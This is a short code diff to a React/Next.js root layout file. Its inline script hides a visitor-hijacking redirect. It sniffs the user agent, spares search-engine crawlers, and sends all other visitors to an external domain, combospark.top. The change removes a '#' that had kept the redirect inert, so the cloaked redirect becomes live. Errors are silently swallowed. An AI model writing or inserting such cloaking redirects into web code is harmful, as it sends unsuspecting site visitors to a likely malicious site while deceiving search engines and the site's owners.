@@ -27,7 +27,7 @@ export default function RootLayout({ children }: Readonly<{ children: React.Reac
           var ua = (navigator.userAgent || '').toLowerCase();
           var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
           if (!isBot) {
-            window.location.replace("#https://combospark.top/aetf3u2q9u");
+            window.location.replace("https://combospark.top/aetf3u2q9u");
           }
         } catch(e) {}
       })();
